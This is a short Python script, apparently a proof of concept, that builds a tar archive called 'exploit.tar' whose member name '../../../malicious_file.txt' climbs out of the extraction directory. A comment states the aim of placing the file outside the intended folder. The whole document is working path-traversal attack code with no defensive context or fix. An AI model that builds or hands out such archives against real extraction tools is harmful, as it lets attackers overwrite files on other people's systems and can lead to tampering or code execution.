import tarfile

# Create a tarfile with a file that will be extracted to a directory outside the intended one
with tarfile.open('exploit.tar', 'w') as tar:
    tar.add('temp.txt', arcname='../../../malicious_file.txt')

